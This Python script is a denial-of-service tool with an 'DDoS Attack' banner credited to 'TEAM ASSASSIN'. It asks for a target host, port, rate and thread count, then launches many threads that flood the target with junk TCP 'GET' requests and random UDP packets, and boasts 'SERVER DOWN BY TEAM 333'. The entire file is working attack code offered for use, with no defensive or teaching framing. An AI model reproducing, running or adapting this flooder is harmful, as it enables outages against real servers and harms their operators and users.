import socket
import threading
import random
import time
import os

from threading import Thread

os.system("clear")

class ConsoleColors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    BOLD = '\033[1m'

print(ConsoleColors.FAIL + '''
      
 ██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░

┏━━━┳━━━┓╋╋┏━━━┓
┗┓┏┓┣┓┏┓┃╋╋┃┏━┓┃
╋┃┃┃┃┃┃┃┣━━┫┗━━┓
╋┃┃┃┃┃┃┃┃┏┓┣━━┓┃
┏┛┗┛┣┛┗┛┃┗┛┃┗━┛┃
┗━━━┻━━━┻━━┻━━━┛
┏━━━┓┏┓╋┏┓╋╋╋╋╋╋┏┓
┃┏━┓┣┛┗┳┛┗┓╋╋╋╋╋┃┃
┃┃╋┃┣┓┏┻┓┏╋━━┳━━┫┃┏┓
┃┗━┛┃┃┃╋┃┃┃┏┓┃┏━┫┗┛┛
┃┏━┓┃┃┗┓┃┗┫┏┓┃┗━┫┏┓┓
┗┛╋┗┛┗━┛┗━┻┛┗┻━━┻┛┗┛ 

                 TEAM ASSASSIN TNIK KOOL

      ╔═════════════════════════════════════╗   
      ║       Creat by KARASKO & YOUPI         ║
      ╚═════════════════════════════════════╝
''')

def getport():
    try:
        return int(input(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "Port:\r\n"))
    except ValueError:
        print(ConsoleColors.BOLD + ConsoleColors.WARNING + "ERROR Port must be a number, set to default: 80")
        return 80

host = input(ConsoleColors.BOLD + ConsoleColors.OKBLUE + "Host:\r\n")
port = getport()
speedPerRun = int(input(ConsoleColors.BOLD + ConsoleColors.HEADER + "Hits Per Run:\r\n"))
threads = int(input(ConsoleColors.BOLD + ConsoleColors.WARNING + "Thread Count:\r\n"))

ip = socket.gethostbyname(host)
bytesToSend = os.urandom(2450)

class Count:
    packetCounter = 0 

def goForDosThatThing():
    while True:
        try:
            dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            dosSocket.connect((ip, port))
            for _ in range(speedPerRun):
                try:
                    request = b"GET " + bytesToSend + b" HTTP/1.1\r\n"
                    dosSocket.send(request)
                    dosSocket.sendto(request, (ip, port))
                    Count.packetCounter += 1
                    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN +
                          f"-----< PACKET {ConsoleColors.FAIL}{Count.packetCounter}{ConsoleColors.OKGREEN} SENT AT: {ConsoleColors.FAIL}{time.strftime('%d-%m-%Y %H:%M:%S', time.gmtime())}{ConsoleColors.OKGREEN} >-----")
                except socket.error:
                    print(ConsoleColors.WARNING + "SERVER DOWN BY TEAM 333!!!!!!")
            dosSocket.close()
        except socket.error:
            print(ConsoleColors.WARNING + "SERVER DOWN BY TEAM 333!!!!!!")
        except KeyboardInterrupt:
            print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\n[-] Canceled by user")
            break

def udp_flood():
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = os.urandom(2450)
    while True:
        try:
            for _ in range(speedPerRun):
                udp_socket.sendto(packet, (ip, port))
                Count.packetCounter += 1
                print(ConsoleColors.BOLD + ConsoleColors.OKBLUE +
                      f"[UDP] Packet {ConsoleColors.FAIL}{Count.packetCounter}{ConsoleColors.OKBLUE} sent at {ConsoleColors.FAIL}{time.strftime('%H:%M:%S', time.gmtime())}")
        except socket.error:
            print(ConsoleColors.WARNING + "[UDP] Target might be down.")
        except KeyboardInterrupt:
            break

try:
    print(ConsoleColors.BOLD + ConsoleColors.OKBLUE + "\n")
    for percent in [0, 25, 50, 75, 100]:
        color = ConsoleColors.OKGREEN if percent <= 25 else ConsoleColors.WARNING if percent < 100 else ConsoleColors.FAIL
        print(ConsoleColors.BOLD + color + f"TEAM assassin BDA YNIK F SERVER {percent}%")
        time.sleep(1)

    for _ in range(threads):
        Thread(target=goForDosThatThing).start()
        Thread(target=udp_flood).start()

except KeyboardInterrupt:
    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\n[-] Canceled by user")